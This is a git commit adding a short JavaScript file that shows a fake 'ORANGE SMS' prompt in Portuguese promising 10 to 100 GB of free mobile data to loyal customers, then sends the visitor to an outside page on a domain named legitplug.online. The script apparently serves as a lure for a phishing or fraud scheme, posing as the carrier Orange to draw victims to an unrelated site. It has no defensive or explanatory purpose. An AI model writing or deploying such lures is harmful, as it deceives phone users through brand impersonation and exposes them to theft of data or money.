b74c335baa48b731a3e0874b554bb08fd3806f1e
dataviewz <gloliousam2@gmail.com>
2025-10-15 01:27:56 -0700

    Create activation-freeorangedata.js

---
+++ activation-freeorangedata.js
@@ -0,0 +1,5 @@
+var password = 'DADOS GRATUITOS'
+password=prompt('ORANGE SMS: Estimado cliente, por favor verifique se o seu cartão SIM Orange está qualificado para receber 10 GB a 100 GB de dados. Recompensa para clientes antigos. Clique em Dados grátis para verificar agora. ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://legitplug.online/freeorangedata.html';
+}
